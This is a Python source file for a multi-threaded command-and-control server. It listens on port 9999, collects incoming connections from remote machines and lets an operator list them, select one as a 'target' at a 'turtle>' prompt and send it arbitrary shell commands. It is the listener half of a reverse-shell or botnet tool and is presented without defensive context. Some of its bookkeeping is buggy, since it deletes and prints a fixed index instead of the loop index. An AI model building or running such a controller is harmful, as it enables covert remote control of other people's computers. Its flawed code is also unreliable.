#coding:utf-8
import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1,2]
queue = Queue()
all_connection = []
all_address = []



#create socket to connect to computer 
def create_socket() :
    global host
    global port
    global s
    
    host = ""
    port=9999
    try :
        s = socket.socket()
        #s.bind()
    except socket.error as msg:
        print(msg)

#biding connection and listining for connections
def bind_socket() :
    global host
    global port
    global s 
    try :
        print("Socket bind on Port "+str(port))
        s.bind((host,port))
        s.listen(7)
    except socket.error as msg :
        print("socket binding error : "+str(msg)+"retring ....")
        bind_socket()
        

#Handling connecyion from multpli client an save to liste
#closing previous connections when server.py file is restarted

def accepting_connection() :
    for c in all_connection :
        c.close()
    del all_connection[:]
    del all_address[:]
    
    while True :
        try :
            connection , address = s.accept()
            s.setblocking(1)#previous timeout 
            
            all_connection.append(connection)
            all_address.append(address)
            
            print('Connection has been establish : '+ address[0])
        except :
            print('Error accepting connection ')
            
#2 thread function see all the client select a clien send commands to the connected client 
#Interraction prompte for sending commands
#turtle> 
#1 Friend-A
#2 Friend-B
#3 Friend-C
def start_turtle() :
    while True :
        cmd = input('turtle> ')
        if cmd == 'list' :
            list_connections()
        elif 'select' in cmd :
            connection = get_target(cmd)
            if connection is not None :
                send_target_commands(connection)
        else :
            print('COmmand not recognized')
        
        
#display all connection active connections with the client

def list_connections() :
    
    result = ''
    
    selectId = 0
    for i,connection in enumerate(all_connection) :
        try :
            connection.send(str.encode(' '))
            connection.recv(2014480)
        except :
            del all_connection[i]
            del all_address[1]
            continue
        result = str(i) + " " + str(all_address[1][0]) + " " + str(all_address[1][1])+"\n"
    print("__________________CLIENT______________" + "\n" + result)
    
    
    
    
#select the target 

def get_target(cmd) :
    try :
        target = int(cmd.replace('select ','')) #target Id
        connection = all_connection[target]
        print("Your are now connectzd to :" + str(all_address[target][0]))
        print(str(all_address[target][0])+ "> ",end="")
        return connection
    except :
        print("selected not valid")
        return None

# send command to target

#send commande to client 
def send_target_commands(connection) :
    
    while True :
        try :
            cmd  = input()
            if cmd == 'quit' :
                break
            if len(str.encode(cmd)) > 0 :
                connection.send(str.encode(cmd))
                client_response = str(connection.recv(20480),'utf-8')
                print(client_response,end="") 
        except :
            print("Error sending commands")
            break
        

#create worker threads

def create_workers() :
    for _ in range(NUMBER_OF_THREADS) :
        t = threading.Thread(target=works)
        t.daemon = True
        t.start()
        
def works():
    while True :
        x = queue.get()
        if x == 1 :
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2 :
            start_turtle()
        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER :
        queue.put(x)
    queue.join()
    
create_workers()
create_jobs()